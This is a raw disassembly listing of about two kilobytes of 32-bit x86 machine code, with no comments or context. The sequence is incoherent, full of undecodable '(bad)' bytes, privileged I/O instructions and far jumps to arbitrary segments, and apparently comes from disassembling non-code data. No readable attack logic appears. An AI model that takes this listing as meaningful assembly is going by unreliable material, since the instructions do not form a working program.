  40d5fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5fd:	inc    esi
  40d5fe:	(bad)  
  40d5ff:	retf   
  40d600:	fldcw  WORD PTR [edx]
  40d602:	aaa    
  40d603:	adc    ah,BYTE PTR [eax+0x390f8d4b]
  40d609:	jmp    0xd4d1:0xc828ffa
  40d610:	jne    0x40d618
  40d612:	ds mov ah,0x1b
  40d615:	rcl    BYTE PTR [esi+0x50f7a23],1
  40d61b:	pop    eax
  40d61c:	xor    edi,edi
  40d61e:	test   DWORD PTR [edx-0x362d13c3],0xaa78ea47
  40d628:	(bad)  
  40d629:	das    
  40d62a:	mov    DWORD PTR [edi+edx*8],esp
  40d62d:	jb     0x40d5f7
  40d62f:	jne    0x40d5fd
  40d631:	adc    ecx,DWORD PTR [edx]
  40d633:	xchg   ebp,eax
  40d634:	ret    0x533c
  40d637:	sub    al,bh
  40d639:	jmp    0x26658667
  40d63e:	mov    dl,0x1
  40d640:	(bad)  
  40d642:	mov    al,0x6e
  40d644:	mov    ch,0xfd
  40d646:	pop    esp
  40d647:	dec    esi
  40d648:	mov    fs,WORD PTR [ebp-0x5c]
  40d64b:	imul   edx,DWORD PTR [ecx+ebp*2-0x2d],0x2ea7a212
  40d653:	sub    ecx,esi
  40d655:	mov    eax,ecx
  40d657:	pusha  
  40d658:	cdq    
  40d659:	mov    ecx,esp
  40d65b:	fnstcw WORD PTR [esi+0x3]
  40d65e:	test   eax,0x752cb102
  40d663:	dec    ebx
  40d664:	(bad)  
  40d666:	mov    ds,WORD PTR [ecx+0x0]
  40d669:	mov    ebx,0x7a69068d
  40d66e:	rol    bh,0x56
  40d671:	push   esi
  40d672:	es inc eax
  40d674:	lea    ebx,[ecx]
  40d676:	iret   
  40d677:	fucomp st(1)
  40d679:	xchg   ebx,eax
  40d67a:	das    
  40d67b:	add    eax,0x9c91f72e
  40d680:	jp     0x40d6c3
  40d682:	mov    ebp,0x72a9392
  40d687:	ds jmp 0x56a5f8e0
  40d68d:	mov    ds,WORD PTR [eax]
  40d68f:	icebp  
  40d690:	popa   
  40d691:	aas    
  40d692:	out    0x39,eax
  40d694:	or     eax,0x7e7c0498
  40d699:	adc    al,0x42
  40d69b:	lahf   
  40d69c:	cmp    eax,0xda66ffbd
  40d6a1:	mov    al,ds:0xd2065bc0
  40d6a6:	pop    ebx
  40d6a7:	fcmovnb st,st(6)
  40d6a9:	leave  
  40d6aa:	xchg   ecx,eax
  40d6ab:	ficomp DWORD PTR [eax]
  40d6ad:	push   ecx
  40d6ae:	mov    edx,0xf44600fd
  40d6b3:	adc    BYTE PTR [esi],dh
  40d6b5:	jne    0x40d695
  40d6b7:	mov    cl,BYTE PTR [ebx-0x2bee027f]
  40d6bd:	mov    WORD PTR [ecx+0x10],ds
  40d6c0:	dec    ebx
  40d6c1:	enter  0x50bc,0xb6
  40d6c5:	data16 jo 0x40d73d
  40d6c8:	ins    BYTE PTR es:[edi],dx
  40d6c9:	pop    es
  40d6ca:	aam    0x6f
  40d6cc:	call   0xbbba:0x8539a7ee
  40d6d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6d4:	xchg   esi,eax
  40d6d5:	int    0xb4
  40d6d7:	pop    ecx
  40d6d8:	xor    al,0x52
  40d6da:	nop
  40d6db:	mov    ch,0xea
  40d6dd:	mov    edx,0x78620ec5
  40d6e2:	push   ebx
  40d6e3:	cdq    
  40d6e4:	jbe    0x40d666
  40d6e6:	das    
  40d6e7:	pop    esi
  40d6e8:	out    dx,eax
  40d6e9:	xor    eax,0xbb2709c7
  40d6ee:	or     eax,0xdbdfd50f
  40d6f3:	cmp    bl,BYTE PTR [ebp+eiz*2-0x273f34ab]
  40d6fa:	lds    ebx,FWORD PTR [ecx]
  40d6fc:	arpl   WORD PTR [ebp+0x60],si
  40d6ff:	cdq    
  40d700:	mov    al,ds:0x17eee7b2
  40d705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d706:	leave  
  40d707:	test   BYTE PTR [ecx+0x50],dh
  40d70a:	pop    ss
  40d70b:	xor    DWORD PTR [esi+0x4d141370],0xa8333e5b
  40d715:	pop    es
  40d716:	call   0x861b9207
  40d71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d71c:	gs jne 0x40d792
  40d71f:	test   al,0x91
  40d721:	and    bl,al
  40d723:	mov    edx,0x53e6b66d
  40d728:	push   0x2194986a
  40d72d:	xor    al,bl
  40d72f:	fnstcw WORD PTR [ecx-0x3883d9f]
  40d735:	(bad)  
  40d736:	js     0x40d767
  40d738:	sbb    ebp,ebx
  40d73a:	jge    0x40d744
  40d73c:	ret    
  40d73d:	push   eax
  40d73e:	ja     0x40d74f
  40d740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d741:	dec    esp
  40d742:	inc    ebx
  40d743:	and    BYTE PTR [eax+0x6f8134ad],bl
  40d749:	aad    0xc6
  40d74b:	ins    BYTE PTR es:[edi],dx
  40d74c:	jne    0x40d730
  40d74e:	xchg   ebp,eax
  40d74f:	and    esi,DWORD PTR [edx+0x3e]
  40d752:	call   0x312c:0xda5a88d2
  40d759:	sub    al,0x7d
  40d75b:	test   DWORD PTR [edi],esi
  40d75d:	push   ebp
  40d75e:	mov    bl,0x71
  40d760:	mov    bl,0xbd
  40d762:	std    
  40d763:	add    BYTE PTR [edx+0x3989623d],cl
  40d769:	push   es
  40d76a:	xchg   edx,eax
  40d76b:	fcom   DWORD PTR [ebp-0x71]
  40d76e:	pushf  
  40d76f:	ins    DWORD PTR es:[edi],dx
  40d770:	mov    eax,ds:0xd3ade96a
  40d775:	std    
  40d776:	shl    DWORD PTR [edx+0x341315ee],1
  40d77c:	sbb    BYTE PTR [edi],0x65
  40d77f:	jae    0x40d72d
  40d781:	(bad)  
  40d782:	repz push ebp
  40d784:	sbb    eax,0x9419ffb4
  40d789:	mov    ebx,0xbfaa57ae
  40d78e:	xchg   DWORD PTR [edi-0x41],esi
  40d791:	imul   ecx,esp,0x79
  40d794:	sahf   
  40d795:	adc    eax,0x792e5004
  40d79a:	xlat   BYTE PTR ds:[ebx]
  40d79b:	jns    0x40d7b7
  40d79d:	dec    ebp
  40d79e:	and    eax,0xe79e3675
  40d7a3:	adc    eax,0xbdd67bae
  40d7a8:	ret    0x53c9
  40d7ab:	lea    edx,[edx+0x4aa84f04]
  40d7b1:	jne    0x40d737
  40d7b3:	mov    ds:0x104d93e2,al
  40d7b8:	jle    0x40d7dc
  40d7ba:	(bad)  
  40d7bb:	push   ds
  40d7bc:	pop    ebp
  40d7bd:	dec    esp
  40d7be:	lds    edi,FWORD PTR [eax+0x6ee0db96]
  40d7c4:	(bad)  
  40d7c5:	mov    bh,0x9b
  40d7c7:	pmaxsw mm2,mm5
  40d7ca:	(bad)  
  40d7cb:	hlt    
  40d7cc:	sub    eax,0xed3a73
  40d7d1:	loopne 0x40d764
  40d7d3:	sbb    DWORD PTR [esi+0x37],esp
  40d7d6:	sub    eax,0xe4b38f07
  40d7db:	aad    0x27
  40d7dd:	scas   eax,DWORD PTR es:[edi]
  40d7de:	(bad)  
  40d7df:	fstp   DWORD PTR [ebp-0x20]
  40d7e2:	test   DWORD PTR [ebp+0x2beb076],0xc364f45e
  40d7ec:	pop    ecx
  40d7ed:	cmp    BYTE PTR [edx],cl
  40d7ef:	mov    ds:0x359fd0ec,eax
  40d7f5:	mov    dl,0xa6
  40d7f7:	mov    BYTE PTR [esi-0x4e],bl
  40d7fa:	(bad)  
  40d7fb:	sbb    eax,0x1de700e0
  40d800:	sub    ah,BYTE PTR [edi-0x6183bf29]
  40d806:	ret    
  40d807:	inc    edi
  40d808:	add    ecx,DWORD PTR [edi]
  40d80a:	cwde   
  40d80b:	xchg   ebp,eax
  40d80c:	push   ecx
  40d80d:	cmp    eax,0xd7674d02
  40d812:	and    DWORD PTR [edi+0x2a],ebp
  40d815:	imul   esi,DWORD PTR [edx+0x356a6748],0xffffffbe
  40d81c:	shl    BYTE PTR [edi-0x52],0x10
  40d820:	call   0x38339e02
  40d825:	inc    bp
  40d827:	mov    ebp,0x3524e08a
  40d82c:	xchg   edx,eax
  40d82d:	mov    dl,0xc7
  40d82f:	cs ja  0x40d80a
  40d832:	cwde   
  40d833:	fsubr  st(3),st
  40d835:	inc    edx
  40d836:	cld    
  40d837:	stos   DWORD PTR es:[edi],eax
  40d838:	(bad)
  40d83b:	inc    edi
  40d83d:	enter  0x712,0xfc
  40d841:	pop    ds
  40d842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d843:	pop    edx
  40d844:	sub    BYTE PTR [esi+0x40529bb0],0x8b
  40d84b:	pop    ds
  40d84c:	mov    ah,0x75
  40d84e:	or     ch,BYTE PTR [esi-0x51cd571e]
  40d854:	pop    ebx
  40d855:	sub    BYTE PTR [edi-0x4d],bl
  40d858:	sbb    esi,DWORD PTR [edx+0x1f]
  40d85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d85c:	je     0x40d810
  40d85e:	icebp  
  40d85f:	stc    
  40d860:	ror    BYTE PTR [eax],0xc1
  40d863:	outs   dx,BYTE PTR ds:[esi]
  40d864:	adc    eax,0x6b777e40
  40d869:	cmp    al,BYTE PTR [ebx]
  40d86b:	pop    ebx
  40d86c:	inc    esp
  40d86d:	xor    ch,ah
  40d86f:	or     ah,BYTE PTR [eax]
  40d871:	mov    eax,0x77c3a2f7
  40d876:	imul   DWORD PTR [ebx]
  40d878:	and    dh,dh
  40d87a:	mov    ds:0x9f87e8e2,al
  40d87f:	sbb    BYTE PTR ds:0x15e63c3b,al
  40d885:	shr    BYTE PTR [esi],1
  40d887:	xchg   DWORD PTR [eax-0x75],edi
  40d88a:	adc    DWORD PTR [esi+0x6a],esi
  40d88d:	xlat   BYTE PTR ds:[ebx]
  40d88e:	mov    ?,WORD PTR [edx-0x29]
  40d891:	retf   0xa45c
  40d894:	mov    es,WORD PTR [ebx-0x6700b85a]
  40d89a:	into   
  40d89b:	sbb    DWORD PTR [eax+0x66],ebp
  40d89e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d89f:	xor    al,0xd7
  40d8a1:	mov    WORD PTR [eax+0x26],cx
  40d8a5:	push   sp
  40d8a7:	leave  
  40d8a8:	pop    esp
  40d8a9:	pop    esi
  40d8aa:	call   0x8a43:0xf7247bb5
  40d8b1:	xchg   DWORD PTR [edx+0x39],ebx
  40d8b4:	mov    cl,0xc3
  40d8b6:	pop    ecx
  40d8b7:	cdq    
  40d8b8:	cmc    
  40d8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8ba:	or     BYTE PTR [edx],al
  40d8bc:	mov    eax,ds:0x60f5c0f
  40d8c1:	add    ch,BYTE PTR ds:0xb4ace411
  40d8c7:	lea    ecx,[ebx]
  40d8c9:	adc    BYTE PTR [ebp+0x17e9b41e],cl
  40d8cf:	fild   DWORD PTR [eax+0x3d]
  40d8d2:	jno    0x40d8cb
  40d8d4:	out    0x24,eax
  40d8d6:	sub    ebp,esp
  40d8d8:	mov    dl,0x98
  40d8da:	inc    ebp
  40d8db:	adc    eax,0xc0f4f4e7
  40d8e0:	dec    edx
  40d8e1:	out    dx,al
  40d8e2:	icebp  
  40d8e3:	sbb    dl,0xbd
  40d8e6:	ins    DWORD PTR es:[edi],dx
  40d8e7:	shl    DWORD PTR [edx+ecx*2-0x51c3bd7f],0xda
  40d8ef:	jmp    0x1933:0xb3bac861
  40d8f6:	stos   DWORD PTR es:[edi],eax
  40d8f7:	cmp    BYTE PTR [esi-0x1e],cl
  40d8fa:	adc    eax,0x61808376
  40d8ff:	(bad)  
  40d900:	leave  
  40d901:	sbb    edi,DWORD PTR [edi+eax*1+0x4173ab23]
  40d908:	outs   dx,BYTE PTR ds:[esi]
  40d909:	repnz sub bl,BYTE PTR [ebx+edx*1+0x5b]
  40d90e:	xchg   ecx,eax
  40d90f:	push   eax
  40d910:	dec    ebp
  40d911:	push   0xd6932167
  40d916:	jmp    0x40d94c
  40d918:	or     DWORD PTR [ecx],esp
  40d91a:	cmp    DWORD PTR [ecx+ecx*1+0x62],eax
  40d91e:	(bad)  
  40d91f:	jno    0x40d8d9
  40d921:	dec    ebx
  40d922:	gs pushf 
  40d924:	inc    edx
  40d925:	push   ebp
  40d926:	jmp    0x40d956
  40d928:	sub    cl,ch
  40d92a:	mov    al,ds:0x8cc96946
  40d92f:	cmp    BYTE PTR [eax-0x2f],dl
  40d932:	int3   
  40d933:	xchg   DWORD PTR [edi-0x9],ecx
  40d936:	or     eax,0xf854a721
  40d93b:	push   cs
  40d93c:	mov    ah,0xd9
  40d93e:	add    BYTE PTR [edx],ch
  40d940:	mov    ?,WORD PTR [esi]
  40d942:	jp     0x40d9bc
  40d944:	cmp    al,0xd7
  40d946:	retf   
  40d947:	pop    ebp
  40d948:	enter  0x65e8,0xa
  40d94c:	pop    ebx
  40d94d:	jecxz  0x40d944
  40d94f:	mov    dl,BYTE PTR [bx+di]
  40d952:	ins    BYTE PTR es:[edi],dx
  40d953:	pusha  
  40d954:	jne    0x40d93e
  40d956:	or     ecx,0xffffffdc
  40d959:	mov    edx,0x3e19d0fb
  40d95e:	neg    BYTE PTR [ecx]
  40d960:	nop
  40d961:	int    0x2a
  40d963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d964:	sub    eax,0x6eab0cfc
  40d969:	jmp    0x40d988
  40d96b:	ds out dx,al
  40d96d:	ja     0x40d9e8
  40d96f:	imul   DWORD PTR ds:0x92bc2359
  40d975:	sbb    DWORD PTR [ebp+0x65919466],ebp
  40d97b:	pop    es
  40d97c:	push   es
  40d97d:	lods   eax,DWORD PTR ds:[esi]
  40d97e:	adc    eax,0x93651472
  40d983:	xchg   esi,eax
  40d984:	xor    eax,DWORD PTR ds:0xe30dd95e
  40d98a:	cmp    al,0x18
  40d98c:	icebp  
  40d98d:	outs   dx,DWORD PTR ds:[esi]
  40d98e:	outs   dx,DWORD PTR ds:[esi]
  40d98f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d990:	iret   
  40d991:	or     edx,edx
  40d993:	dec    edx
  40d994:	add    ebp,DWORD PTR [ecx-0x4c]
  40d997:	gs call 0xac64:0x8d3e16ec
  40d99f:	inc    ebp
  40d9a0:	popa   
  40d9a1:	add    eax,DWORD PTR [ebp+0x30198a44]
  40d9a7:	jns    0x40d9e3
  40d9a9:	sub    al,0xe3
  40d9ab:	cmp    eax,0x522fbddc
  40d9b0:	jne    0x40d95d
  40d9b2:	inc    eax
  40d9b3:	not    bh
  40d9b5:	sbb    dl,bh
  40d9b7:	jmp    0xd7126f9d
  40d9bc:	(bad)  [ebp+0x7f]
  40d9bf:	mov    gs,eax
  40d9c1:	xor    eax,ecx
  40d9c3:	pop    esi
  40d9c4:	mov    edi,0xe23df530
  40d9c9:	mov    bl,0x1a
  40d9cb:	adc    DWORD PTR [eax-0x18d4f129],eax
  40d9d1:	fist   WORD PTR [edx-0x638db61b]
  40d9d7:	jl     0x40da18
  40d9d9:	push   ecx
  40d9da:	pop    esi
  40d9db:	pop    edx
  40d9dc:	stos   BYTE PTR es:[edi],al
  40d9dd:	hlt    
  40d9de:	arpl   WORD PTR [ecx-0x3f],ax
  40d9e1:	sbb    DWORD PTR [esi],ecx
  40d9e3:	in     eax,0x5c
  40d9e5:	sbb    DWORD PTR [ebp+esi*2+0x41],ebx
  40d9e9:	xor    eax,0xf25be464
  40d9ee:	xchg   edi,eax
  40d9ef:	daa    
  40d9f0:	mov    eax,0x14bb496e
  40d9f5:	(bad)  
  40d9f6:	cmp    ah,BYTE PTR [ebx]
  40d9f8:	test   eax,0xbe84e421
  40d9fd:	sub    BYTE PTR [edi-0x3b],0x3c
  40da01:	frstor [ecx-0x64]
  40da04:	push   0x5b
  40da06:	out    dx,eax
  40da07:	pushf  
  40da08:	lea    edx,[eax]
  40da0a:	je     0x40da4b
  40da0c:	sbb    eax,0x1aa580e3
  40da11:	push   esi
  40da12:	sar    eax,0x20
  40da15:	daa    
  40da16:	mov    ebx,0xc9495553
  40da1b:	imul   edx,DWORD PTR [edx+0x683bf424],0xbfd46892
  40da25:	jbe    0x40da0f
  40da27:	imul   edi,DWORD PTR [edx+0x2efa462],0x3fc6bf4f
  40da31:	sub    BYTE PTR gs:[edx+0x4b],al
  40da35:	std    
  40da36:	sti    
  40da37:	mov    ecx,0x4249e285
  40da3c:	cmc    
  40da3d:	lea    esi,[ecx+0x53b3c076]
  40da43:	pop    esp
  40da44:	xor    edi,DWORD PTR [eax-0x4b6f3f6f]
  40da4a:	sbb    BYTE PTR [ebx],cl
  40da4c:	js     0x40da65
  40da4e:	shl    ebx,0x60
  40da51:	clc    
  40da52:	push   edx
  40da53:	nop
  40da54:	loopne 0x40da0d
  40da56:	(bad)  
  40da57:	mov    WORD PTR [ebx+0x64],cs
  40da5a:	push   es
  40da5b:	int3   
  40da5c:	repz arpl WORD PTR [ecx-0x452ff4e5],cx
  40da63:	mov    al,BYTE PTR [ecx+0x54]
  40da66:	ret    
  40da67:	fisubr DWORD PTR [ebp+0xe4a01cd]
  40da6d:	add    al,0xdd
  40da6f:	popa   
  40da70:	sahf   
  40da71:	add    BYTE PTR [eax-0x7254b80e],dl
  40da77:	call   0x28a51e00
  40da7c:	or     eax,0xdf1918c2
  40da81:	repz std 
  40da83:	cmp    DWORD PTR [ecx-0x20ae0e83],ebp
  40da89:	sbb    BYTE PTR [esi],ah
  40da8b:	ds data16 cmc 
  40da8e:	(bad)  
  40da8f:	rcr    BYTE PTR [ebp+0x1d],0x64
  40da93:	jo     0x40da8b
  40da95:	push   ebp
  40da96:	test   BYTE PTR [edi-0x24e7fe35],ah
  40da9c:	stc    
  40da9d:	jecxz  0x40dabe
  40da9f:	dec    eax
  40daa0:	xor    ah,BYTE PTR ds:0xbe75d9c8
  40daa6:	xor    ah,bh
  40daa8:	dec    esp
  40daa9:	sub    bl,BYTE PTR [edx-0x434de03a]
  40daaf:	(bad)  
  40dab0:	aas    
  40dab1:	std    
  40dab2:	xor    al,0x3a
  40dab4:	ret    
  40dab5:	mov    DWORD PTR [ecx],ebp
  40dab7:	rol    DWORD PTR [eax+0x76fceaaa],1
  40dabd:	lods   eax,DWORD PTR ds:[esi]
  40dabe:	repnz inc esi
  40dac0:	mov    ds:0x40ee5979,al
  40dac5:	mov    ebp,0xd98b7551
  40daca:	pop    eax
  40dacb:	in     eax,0x70
  40dacd:	fmul   st,st(0)
  40dacf:	mov    ecx,0x2f11e53f
  40dad4:	jmp    0x5d503e75
  40dad9:	call   0x706f:0xf9723afe
  40dae0:	sahf   
  40dae1:	icebp  
  40dae2:	jmp    0xba2d:0xa28cc01
  40dae9:	or     al,0xc4
  40daeb:	rcr    cl,1
  40daed:	inc    BYTE PTR [edi-0x1ee0e594]
  40daf3:	das    
  40daf4:	adc    al,0x54
  40daf6:	int    0x2b
  40daf8:	pop    ds
  40daf9:	cdq    
  40dafa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dafb:	mov    al,0xde
  40dafd:	in     al,dx
  40dafe:	cmp    DWORD PTR [ecx+0x29d8f9d9],ebx
  40db04:	lods   eax,DWORD PTR ds:[esi]
  40db05:	push   esp
  40db06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db07:	push   edx
  40db08:	mov    edi,0x7e521e3a
  40db0d:	add    bh,ah
  40db0f:	cdq    
  40db10:	dec    esp
  40db11:	fs out dx,al
  40db13:	or     DWORD PTR [ecx],esi
  40db15:	inc    esp
  40db16:	xchg   esi,eax
  40db17:	push   ds
  40db18:	das    
  40db19:	mov    ds:0x82d9c8ca,eax
  40db1e:	adc    eax,0x4555bc42
  40db23:	ret    
  40db24:	sahf   
  40db25:	mov    ecx,esp
  40db27:	nop
  40db28:	inc    esp
  40db29:	gs ss jo 0x40dad9
  40db2d:	jmp    0x7544:0xfd25ea24
  40db34:	and    BYTE PTR [esi+0x4],0x9c
  40db38:	stos   DWORD PTR es:[edi],eax
  40db39:	pusha  
  40db3a:	xchg   bh,ah
  40db3c:	ror    edi,0x61
  40db3f:	fld    TBYTE PTR [ebx-0x4922dae3]
  40db45:	xor    eax,0xcc70073
  40db4a:	dec    esi
  40db4b:	loope  0x40db4a
  40db4d:	fisttp WORD PTR [edi]
  40db4f:	leave  
  40db50:	scas   al,BYTE PTR es:[edi]
  40db51:	(bad)  
  40db52:	popf   
  40db53:	cld    
  40db54:	ficom  DWORD PTR [ebx-0x53d1ed41]
  40db5a:	lds    eax,FWORD PTR [ebp-0x522a39bd]
  40db60:	or     BYTE PTR [edx+0x3],dl
  40db63:	pop    ebp
  40db64:	ins    DWORD PTR es:[edi],dx
  40db65:	xchg   ebp,eax
  40db66:	xor    ebp,DWORD PTR [ebx-0x6e]
  40db69:	sub    eax,0xa55b6037
  40db6e:	mov    esp,0x12e4a2b7
  40db73:	inc    esi
  40db74:	jbe    0x40db29
  40db76:	sar    dl,0x6
  40db79:	ds push ebx
  40db7b:	sti    
  40db7c:	push   ebx
  40db7d:	faddp  st(0),st
  40db7f:	pop    ecx
  40db80:	jmp    0x23c4967c
  40db85:	dec    edi
  40db86:	sbb    BYTE PTR [esi+0x35],ch
  40db89:	cdq    
  40db8a:	xor    DWORD PTR [ebx],esp
  40db8c:	xor    BYTE PTR ds:[ecx+0x6934a94b],0x59
  40db94:	jno    0x40dbed
  40db96:	sahf   
  40db97:	pop    ds
  40db98:	mov    esp,0xe8cc9e0c
  40db9d:	lahf   
  40db9e:	out    0x66,al
  40dba0:	add    ebp,DWORD PTR [edx+0x1f]
  40dba3:	call   0x5f6a41fe
  40dba8:	rcl    BYTE PTR [edi-0x6bfce3c],1
  40dbae:	aas    
  40dbaf:	fstp   QWORD PTR [edi+0x24]
  40dbb2:	mov    dh,0x7c
  40dbb4:	fisubr DWORD PTR [edx]
  40dbb6:	push   ecx
  40dbb7:	pop    DWORD PTR [ecx+0x4a]
  40dbba:	retf   0x360b
  40dbbd:	ja     0x40db84
  40dbbf:	(bad)  [esi+eax*8+0xcd61d7f]
  40dbc6:	cmp    DWORD PTR [edx],ecx
  40dbc8:	out    0x69,eax
  40dbca:	jl     0x40db4d
  40dbcc:	ins    BYTE PTR es:[edi],dx
  40dbcd:	and    BYTE PTR [bp+di-0x604d],bh
  40dbd2:	(bad)  
  40dbd3:	out    0xd5,eax
  40dbd5:	in     eax,0x67
  40dbd7:	(bad)  
  40dbd8:	div    DWORD PTR [eax-0x3d]
  40dbdb:	leave  
  40dbdc:	cmp    dh,dl
  40dbde:	or     dh,BYTE PTR [edx+0x14]
  40dbe1:	hlt    
  40dbe2:	fstp   TBYTE PTR [edi+0x4c]
  40dbe5:	ficomp DWORD PTR [esp+ebx*1]
  40dbe8:	add    edx,DWORD PTR [eax+eax*1]
  40dbeb:	ins    BYTE PTR es:[edi],dx
  40dbec:	push   ecx
  40dbed:	lea    edi,[ebx+ecx*1-0x16]
  40dbf1:	pop    ebx
  40dbf2:	push   ebp
  40dbf3:	adc    DWORD PTR [edx+0x5e],esp
  40dbf6:	nop
  40dbf7:	(bad)  
  40dbf8:	shl    BYTE PTR [esi],0x3
  40dbfb:	lods   al,BYTE PTR ds:[esi]
  40dbfc:	jb     0x40dbdf
  40dbfe:	lds    eax,FWORD PTR [ebx]
  40dc00:	nop
  40dc01:	ror    DWORD PTR [ecx-0x52a2fa25],cl
  40dc07:	jns    0x40dc71
  40dc09:	and    BYTE PTR [edx],0x2b
  40dc0c:	iret   
  40dc0d:	sbb    dl,0xee
  40dc10:	fmul   DWORD PTR [ebx+eiz*1-0x11793655]
  40dc17:	adc    al,0xd0
  40dc19:	cmp    ecx,esi
  40dc1b:	clc    
  40dc1c:	(bad)  
  40dc1d:	in     eax,dx
  40dc1e:	lds    esi,FWORD PTR [eax+edx*8]
  40dc21:	pop    eax
  40dc22:	popa   
  40dc23:	aas    
  40dc24:	sub    al,0x4d
  40dc26:	sub    BYTE PTR [ebp-0x6a],al
  40dc29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc2a:	cmp    eax,0x93ec1e88
  40dc2f:	stc    
  40dc30:	jo     0x40dc64
  40dc32:	addr16 call 0x5c64:0xbce63fe8
  40dc3a:	loopne 0x40dc2f
  40dc3c:	gs call 0x2e1d9ee
  40dc42:	dec    ebx
  40dc43:	mov    ebp,0xd8fee892
  40dc48:	sub    ebp,DWORD PTR [eax-0x79]
  40dc4b:	cmp    eax,0xd621f8db
  40dc50:	push   edx
  40dc51:	int3   
  40dc52:	pop    eax
  40dc53:	dec    ecx
  40dc54:	aaa    
  40dc55:	inc    edi
  40dc56:	iret   
  40dc57:	and    ecx,eax
  40dc59:	out    0xed,al
  40dc5b:	fdiv   st(6),st
  40dc5d:	xchg   esi,eax
  40dc5e:	dec    ebp
  40dc5f:	push   edx
  40dc60:	mov    ecx,0x21e8b7a9
  40dc65:	lods   al,BYTE PTR ds:[esi]
  40dc66:	mov    al,BYTE PTR [ebp-0xb354c2f]
  40dc6c:	enter  0xb52e,0x76
  40dc70:	cmp    bl,dh
  40dc72:	fdiv   DWORD PTR [edx*2-0x4259e822]
  40dc79:	push   esp
  40dc7a:	out    dx,eax
  40dc7b:	aad    0xb9
  40dc7d:	aam    0x26
  40dc7f:	rcr    BYTE PTR [esi+0x56253bca],1
  40dc85:	jl     0x40dccf
  40dc87:	fsub   QWORD PTR [edi-0x7116e846]
  40dc8d:	ror    dh,cl
  40dc8f:	jns    0x40dc27
  40dc91:	sub    dl,bh
  40dc93:	call   0x26833eb3
  40dc98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc99:	cmp    eax,DWORD PTR [edi]
  40dc9b:	dec    edi
  40dc9c:	xchg   dl,ch
  40dc9e:	mov    ds:0x5cab3c6f,al
  40dca3:	add    edi,ebp
  40dca5:	mov    bh,0xc2
  40dca7:	stos   DWORD PTR es:[edi],eax
  40dca8:	loope  0x40dca9
  40dcaa:	pop    eax
  40dcab:	push   esp
  40dcac:	fcomip st,st(4)
  40dcae:	jno    0x40dcab
  40dcb0:	xor    DWORD PTR [ebp+0x7a9a19d3],ebx
  40dcb6:	adc    cl,BYTE PTR ds:0x2ecabef4
  40dcbc:	rcl    bh,0x7
  40dcbf:	dec    esi
  40dcc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcc1:	cmp    BYTE PTR [edi],bh
  40dcc3:	dec    ecx
  40dcc4:	mov    eax,0x1e0fb0ac
  40dcc9:	mov    ecx,0x83f82747
  40dcce:	inc    ebx
  40dccf:	test   DWORD PTR [ebp-0x3b],edx
  40dcd2:	hlt    
  40dcd3:	or     eax,0x1dce15fc
  40dcd8:	xchg   cl,bl
  40dcda:	mov    al,0xe7
  40dcdc:	daa    
  40dcdd:	xchg   ebx,eax
  40dcde:	test   BYTE PTR [ecx],ch
  40dce0:	mov    eax,0xe3a0497b
  40dce5:	or     DWORD PTR [ebx-0x64],esi
  40dce8:	call   0x2dd1:0xa3d19935
  40dcef:	cmp    eax,0xc92cffd8
  40dcf4:	lahf   
  40dcf5:	mov    al,ds:0x81a670d5
  40dcfa:	fmul   QWORD PTR [ecx+0x274521ef]
  40dd00:	pop    ecx
  40dd01:	loopne 0x40dcf1
  40dd03:	ins    DWORD PTR es:[edi],dx
  40dd04:	scas   al,BYTE PTR es:[edi]
  40dd05:	adc    BYTE PTR [ecx-0x3e95e74e],bh
  40dd0b:	stos   BYTE PTR es:[edi],al
  40dd0c:	and    DWORD PTR ds:0x2ac49d73,esp
  40dd12:	cmp    al,cl
  40dd14:	lahf   
  40dd15:	or     BYTE PTR [ebx],dl
  40dd17:	and    BYTE PTR [ebx+ecx*2-0x79],dl
  40dd1b:	pop    edx
  40dd1c:	xchg   esp,ebp
  40dd1e:	jo     0x40dcff
  40dd20:	outs   dx,BYTE PTR ds:[esi]
  40dd21:	xor    ebp,DWORD PTR [edx-0x69574d0f]
  40dd27:	sbb    bh,BYTE PTR [eax+0x60]
  40dd2a:	sahf   
  40dd2b:	adc    al,0xe2
  40dd2d:	pop    ebp
  40dd2e:	jle    0x40dce5
  40dd30:	scas   al,BYTE PTR es:[edi]
  40dd31:	mov    ebp,DWORD PTR [edi+edi*4]
  40dd34:	mov    cs,edi
  40dd36:	inc    edx
  40dd37:	pop    eax
  40dd38:	jge    0x40ddb9
  40dd3a:	sbb    esp,DWORD PTR [ebx-0x1cc69f9]
  40dd40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd41:	adc    esi,esi
  40dd43:	adc    bh,BYTE PTR [esi+0xbfddd64]
  40dd49:	pop    ds
  40dd4a:	and    BYTE PTR [ecx+eiz*2-0x1c],cl
  40dd4e:	mov    es,WORD PTR [eax]
  40dd50:	shr    ecx,0x98
  40dd53:	sbb    BYTE PTR [ebx],dl
  40dd55:	xchg   edi,eax
  40dd56:	push   esp
  40dd57:	pop    esp
  40dd58:	mov    dl,0x95
  40dd5a:	fmul   st(0),st
  40dd5c:	nop
  40dd5d:	fptan  
  40dd5f:	mov    edx,esp
  40dd61:	jge    0x40dd16
  40dd63:	stos   DWORD PTR es:[edi],eax
  40dd64:	push   esi
  40dd65:	les    ebp,FWORD PTR [eax]
  40dd67:	sbb    al,0x70
  40dd69:	ret    0xa081
  40dd6c:	or     eax,0x7a97ca4a
  40dd71:	mov    esi,0x56a24a56
  40dd76:	adc    al,0xe0
  40dd78:	mov    ecx,0x43b6cbef
  40dd7d:	sbb    al,0x95
  40dd7f:	jbe    0x40dd67
  40dd81:	push   cs
  40dd82:	sbb    BYTE PTR [edx+ecx*4-0x41],ch
  40dd86:	hlt    
